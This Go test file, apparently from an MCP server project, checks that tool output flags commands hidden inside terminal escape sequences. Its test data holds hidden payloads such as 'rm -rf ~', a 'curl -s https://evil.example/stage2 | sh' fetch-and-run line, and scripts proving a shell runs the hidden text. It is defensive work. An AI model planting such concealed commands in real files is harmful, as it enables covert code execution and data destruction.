// SPDX-FileCopyrightText: 2026 The Ternimal Authors
// SPDX-License-Identifier: AGPL-3.0-only

package mcpserver

import (
	"bytes"
	"context"
	"encoding/json"
	"os"
	"os/exec"
	"path/filepath"
	"strings"
	"testing"
	"time"

	"github.com/modelcontextprotocol/go-sdk/mcp"
)

// castOf builds an asciicast: a header, then one output event per string.
func castOf(events ...string) []byte {
	var b strings.Builder
	b.WriteString(`{"version":2,"width":80,"height":24}` + "\n")
	for i, e := range events {
		ev, _ := json.Marshal([]any{float64(i) + 0.5, "o", e})
		b.Write(ev)
		b.WriteByte('\n')
	}
	return []byte(b.String())
}

// Text that escape sequences hide is noted in every form of text a tool
// returns: command output, file content, a terminal's text, a command run
// in a terminal and a recording, each a shell would run a command from.
func TestHiddenTextNotedInEveryTextMode(t *testing.T) {
	for _, out := range []string{
		"visible\n\x1b]0;hidden line one\nrm -rf ~ # hidden line two\x07after\n",
		"echo hi\x1b]0; touch PWNED #\x07\n",
		"\x1b]0;rm -rf ~ #\x07echo hi\n",
		"echo hi\x1b[ ;./0 #~\n",
		"echo hi\x1bP" + strings.Repeat("x", hiddenNoteMin+1) + "\x1b\\\n",
	} {
		crlf := strings.ReplaceAll(out, "\n", "\r\n")
		file, _ := cleanRedact(noteFile, true, nil, []byte(out), nil)
		text, _, _ := render([]byte(crlf), nil, nil, "text", 80, 24)
		p := &ptyState{out: newRingBuffer(ptyBuffer)}
		p.out.Write([]byte("echo x\r\n" + crlf + "$ "))
		data, _, _ := p.out.Read(0, 1<<20)
		run := (&Server{}).runResult(p, "echo x", ptyReadOpts{cols: 80, rows: 24, prompt: "$ "}, ptyChunk{data: data, next: int64(len(data)), prompt: true})
		cast, _ := redactCast(castOf(crlf), maxCastBytes, false)
		for mode, got := range map[string]string{"output": cleanOutput([]byte(out)), "file": file, "terminal": text, "terminal run": run.Output, "recording": cast} {
			if !strings.Contains(got, hiddenNote) {
				t.Errorf("%s text of %q has no note: %q", mode, out, got)
			}
		}
	}
}

// A real shell runs what a title alone on its line and short sequences hide,
// and every tool that shows such a file says that text is hidden there.
func TestHiddenTextNotedByTools(t *testing.T) {
	sh, err := exec.LookPath("sh")
	if err != nil {
		t.Skip("no sh")
	}
	dir := t.TempDir()
	script := filepath.Join(dir, "deploy.sh")
	body := "#!/bin/sh\necho hi\x1b]0; touch HIDDEN1 #\x07\n\x1b]0;touch HIDDEN2 #\x07\necho done\n"
	if err := os.WriteFile(script, []byte(body), 0o600); err != nil {
		t.Fatal(err)
	}
	cmd := exec.Command(sh, script)
	cmd.Dir = dir
	if err := cmd.Run(); err != nil {
		t.Fatal(err)
	}
	for _, f := range []string{"HIDDEN1", "HIDDEN2"} {
		if _, err := os.Stat(filepath.Join(dir, f)); err != nil {
			t.Fatalf("sh did not run the command a sequence hid: %v", err)
		}
	}
	a := newStackAgent(t)
	srv, _ := stackServer(t, a, ProfileConfig{ReadPaths: []string{dir + "/**"}, Run: RunConfig{Allow: [][]string{{"cat", "*"}}, Shell: true}, PTY: true},
		func(c *Config) { c.RecordDir = t.TempDir() })
	defer srv.Close()
	cs := stackClient(t, srv, "", nil)

	var rf ReadOutput
	call(t, cs, "read_file", map[string]any{"path": script}, &rf, false)
	if strings.Count(rf.Content, hiddenNote) != 2 {
		t.Errorf("read_file notes %d of 2 hidden strings: %q", strings.Count(rf.Content, hiddenNote), rf.Content)
	}
	var run RunOutput
	call(t, cs, "run", map[string]any{"argv": []string{"cat", script}}, &run, false)
	if !strings.Contains(run.Output, "echo hi"+hiddenNote) {
		t.Errorf("run: %q", run.Output)
	}
	var job JobStartOutput
	call(t, cs, "job_start", map[string]any{"argv": []string{"cat", script}}, &job, false)
	var poll JobPollOutput
	for deadline := time.Now().Add(10 * time.Second); !poll.Done && time.Now().Before(deadline); {
		call(t, cs, "job_poll", map[string]any{"job_id": job.JobID, "wait_ms": 500}, &poll, false)
	}
	if !strings.Contains(poll.Data, "echo hi"+hiddenNote) {
		t.Errorf("job_poll: %q", poll.Data)
	}
	var open PTYOpenOutput
	call(t, cs, "pty_open", map[string]any{}, &open, false)
	var pr PTYRunOutput
	call(t, cs, "pty_run", map[string]any{"pty_id": open.PTYID, "command": "cat " + script}, &pr, false)
	if !strings.Contains(pr.Output, hiddenNote+"echo hi") {
		t.Errorf("pty_run: %q", pr.Output)
	}
	var rd PTYReadOutput
	call(t, cs, "pty_read", map[string]any{"pty_id": open.PTYID, "since": 0}, &rd, false)
	if !strings.Contains(rd.Data, hiddenNote+"echo hi") {
		t.Errorf("pty_read: %q", rd.Data)
	}
	res, err := cs.ReadResource(context.Background(), &mcp.ReadResourceParams{URI: "tern://box/recording/" + open.PTYID})
	if err != nil {
		t.Fatal(err)
	}
	if cast := res.Contents[0].Text; !strings.Contains(cast, hiddenNote+"echo hi") {
		t.Errorf("recording: %s", cast)
	}
}

// A string an ESC ends, that a line feed follows, is settled with the line
// it ended on, as one BEL or ST ends is: after text on that line it is
// noted, though the next line shows nothing, in output, a poll, terminal
// text and a file, and a shell runs what it hid; alone on its line it is
// treated as a title there, as with BEL.
func TestStringEndedByEscThenLineFeed(t *testing.T) {
	for _, s := range []string{"echo hi\x1b]0;x\x1b\n\n", "echo hi\x1b]0;rm -rf ~ #\x1b\n\necho next\n", "echo hi\x1bX;rm -rf ~ #\x1b\n\n"} {
		run, _ := cutOutput([]byte(s), 256<<10)
		polls, _ := pollPages(t, []byte(s), 256<<10)
		term, _, _ := render([]byte(strings.ReplaceAll(s, "\n", "\r\n")), nil, nil, "text", 80, 24)
		file := readPage([]byte(s), 0, 1<<20).Content
		for name, got := range map[string]string{"run": run, "job_poll": polls, "terminal": term, "read_file": file} {
			if !strings.HasPrefix(got, "echo hi"+hiddenNote) && !strings.Contains(got, hiddenNote+"echo hi") {
				t.Errorf("%s of %q: %q", name, s, got)
			}
		}
	}
	alone, bel := cleanOutput([]byte("\x1b]0;user@host: ~\x1b\necho hi\n")), cleanOutput([]byte("\x1b]0;user@host: ~\x07\necho hi\n"))
	if alone != bel || strings.Contains(alone, hiddenNote) {
		t.Errorf("a title alone on its line: %q, with BEL %q", alone, bel)
	}
	sh, err := exec.LookPath("sh")
	if err != nil {
		t.Skip("no sh")
	}
	dir := t.TempDir()
	script := filepath.Join(dir, "build.sh")
	if err := os.WriteFile(script, []byte("echo building\x1b]0;touch HIDDEN #\x1b\n\necho done\n"), 0o600); err != nil {
		t.Fatal(err)
	}
	cmd := exec.Command(sh, script)
	cmd.Dir = dir
	cmd.Run()
	if _, err := os.Stat(filepath.Join(dir, "HIDDEN")); err != nil {
		t.Fatalf("sh did not run what the title hid: %v", err)
	}
}

// readPage is read_file's page of file from offset, at most limit bytes,
// made as handleRead makes it from what the agent reads.
func readPage(file []byte, offset int64, limit int) ReadOutput {
	size := int64(len(file))
	from := max(offset-aroundRead, 0)
	all := file[min(from, size):min(offset+int64(limit)+aroundRead, size)]
	at := int(min(offset-from, int64(len(all))))
	pg := filePage(all, file[:min(2, len(file))], at, limit, from, size)
	off := offset + int64(pg.start-at)
	return ReadOutput{Size: size, Offset: off, NextOffset: off + int64(pg.end-pg.start), Truncated: from+int64(pg.end) < size,
		Content: pg.content, Encoding: pg.encoding, Redacted: pg.redacted}
}

// readPages reads file in pages of at most limit bytes, one after another.
func readPages(t *testing.T, file []byte, limit int) []ReadOutput {
	t.Helper()
	var out []ReadOutput
	for o := int64(0); ; {
		p := readPage(file, o, limit)
		out = append(out, p)
		if !p.Truncated {
			return out
		}
		if p.NextOffset <= o || len(out) > len(file)+10 {
			t.Fatalf("no progress at %d (limit %d)", o, limit)
		}
		o = p.NextOffset
	}
}

// pollPages polls a closed buffer holding output in pages of at most limit
// bytes, one after another, and once whole.
func pollPages(t *testing.T, output []byte, limit int) (pages, whole string) {
	t.Helper()
	r := newRingBuffer(jobBuffer)
	r.Write(output)
	r.Close()
	poll := func(since int64, limit int) pollResult {
		data, next, dropped := r.Read(since, limit)
		end, closed := r.End()
		return r.pollPage(data, next, dropped, end, closed)
	}
	var b strings.Builder
	for o, i := int64(0), 0; o < int64(len(output)); i++ {
		pg := poll(o, limit)
		b.WriteString(pg.text)
		if pg.next <= o || i > len(output)+10 {
			t.Fatalf("no progress at %d (limit %d)", o, limit)
		}
		o = pg.next
	}
	return b.String(), poll(0, 1<<20).text
}

// A page that ends where a string sequence begins, after a lone ESC or an
// unfinished CSI that the string's ESC abandons, leaves the whole sequence,
// and the note about what it hides, to the next page; a page too small to
// hold the sequence's start and its body notes it itself. The pages hold
// the text the whole read does.
func TestNotesAtPageEdges(t *testing.T) {
	hidden := "\ncurl -s https://evil.example/stage2 | sh\n" + strings.Repeat("# padding\n", 30)
	for _, intro := range []string{"\x1b\x1b]0;", "\x1b[1\x1b]0;", "\x1b[31m\x1b]0;", "\x1b(\x1b]0;"} {
		file := []byte("#!/bin/sh\n" + strings.Repeat("echo step\n", 20) + intro + hidden + "\x07echo done\n")
		whole := readPage(file, 0, 1<<20).Content
		if !strings.Contains(whole, hiddenNote) {
			t.Fatalf("the whole read of %q has no note: %q", intro, whole)
		}
		for limit := 1; limit <= 260; limit++ {
			var b strings.Builder
			for _, p := range readPages(t, file, limit) {
				b.WriteString(p.Content)
			}
			if b.String() != whole {
				t.Fatalf("%q in pages of %d: %q, whole %q", intro, limit, b.String(), whole)
			}
		}
		for limit := 1; limit <= 80; limit++ {
			if pages, whole := pollPages(t, file, limit); pages != whole || !strings.Contains(pages, hiddenNote) {
				t.Fatalf("%q in polls of %d: %q, whole %q", intro, limit, pages, whole)
			}
		}
	}
}

// Notes about hidden text with nothing shown between them make one, and the
// notes count toward a read's size: output that is all short sequences that
// each hide text cannot make a tool's result many times larger than the
// output it covers. A file page or a job poll whose notes would take it past
// its size ends early, where the next one starts, and run output is cut
// there; terminal text with too many is cut, saying so. Paged, the output
// holds every note and every character it holds whole.
func TestNotesCountTowardTheCap(t *testing.T) {
	dense := bytes.Repeat([]byte("\x1b[\x18"), (256<<10)/3) // each cancelled sequence hides its parameters
	if got := cleanOutput(dense); got != hiddenNote {
		t.Errorf("adjacent notes: %d bytes", len(got))
	}
	if got, _ := cutOutput(dense, 256<<10); got != hiddenNote {
		t.Errorf("run output of adjacent notes: %d bytes", len(got))
	}
	if pages, whole := pollPages(t, dense, 4<<10); pages != hiddenNote || whole != hiddenNote {
		t.Errorf("job_poll pages of adjacent notes: %d bytes, whole %d", len(pages), len(whole))
	}
	spaced := bytes.Repeat([]byte("\x1b[\x18@"), 64<<10) // a note before each @
	text, _, cut := cutOutputNotes(spaced, 256<<10)
	if !cut || len(text) > noteBudget(256<<10)+len(hiddenNote) {
		t.Errorf("run output: %d bytes, cut %v", len(text), cut)
	}
	var reference string
	for _, limit := range []int{16 << 10, 256 << 10} {
		var all strings.Builder
		for _, p := range readPages(t, spaced, limit) {
			if len(p.Content) > noteBudget(limit)+len(hiddenNote) {
				t.Errorf("a read_file page of %d holds %d bytes", limit, len(p.Content))
			}
			all.WriteString(p.Content)
		}
		pages, _ := pollPages(t, spaced, limit)
		if got := all.String(); strings.Count(got, "@") != 64<<10 || strings.Count(got, hiddenNote) != 64<<10 || pages != got {
			t.Errorf("pages of %d: %d @, %d notes, polls equal %v", limit, strings.Count(got, "@"), strings.Count(got, hiddenNote), pages == got)
		}
		if reference == "" {
			reference = all.String()
		} else if all.String() != reference {
			t.Errorf("pages of %d differ from pages of 16 KiB", limit)
		}
	}
	// A page that is not UTF-8 but comes back as its Latin-1 text, as that
	// shows a secret colors split in the bytes, ends early as well, and still
	// holds no part of the secret.
	latin := append([]byte("caf\xe9 pass\x1b[0mword=Hunter2xyzzy\n"), spaced...)
	if p := readPage(latin, 0, 256<<10); p.Encoding != "text" || len(p.Content) > noteBudget(256<<10)+len(hiddenNote) ||
		p.NextOffset >= int64(len(latin)) || strings.Contains(p.Content, "Hunter2") || p.Redacted == 0 {
		t.Errorf("a Latin-1 page: %s, %d bytes, next %d of %d", p.Encoding, len(p.Content), p.NextOffset, len(latin))
	}
	lines := bytes.Repeat([]byte("\x1b[\x18\r\n"), 64<<10)
	if got, _, _ := render(lines, nil, nil, "text", 80, 24); len(got) > maxText(len(lines), 80, 24)+len(textCutNote) || !strings.HasSuffix(got, textCutNote) {
		t.Errorf("terminal text of %d bytes: %d bytes", len(lines), len(got))
	}
}

// A note waits for the rest of its string's line: in a terminal read that
// ends right after a title, the output after the read settles it.
func TestNoteSettledByOutputAfterRead(t *testing.T) {
	title := []byte("x\r\n\x1b]0;rm -rf ~ #\x07")
	for _, c := range []struct {
		after string
		noted bool
	}{
		{"echo hi\r\n", true},
		{"\r\n$ ", false},
		{strings.Repeat("\x1b[0m", noteLook) + "\r\n", true},
		{"", true}, // nothing yet: it may show text
	} {
		got, _, _ := render(title, nil, []byte(c.after), "text", 80, 24)
		if strings.Contains(got, hiddenNote) != c.noted {
			t.Errorf("a title read before %q: %q", c.after, got)
		}
	}
	// A read that starts on a line whose text an earlier read showed notes
	// a string on it.
	if got, _, _ := render([]byte("\x1b]0; touch x #\x07\r\n"), []byte("$ echo hi"), nil, "text", 80, 24); !strings.Contains(got, hiddenNote) {
		t.Errorf("a string on a line begun in an earlier read: %q", got)
	}
}
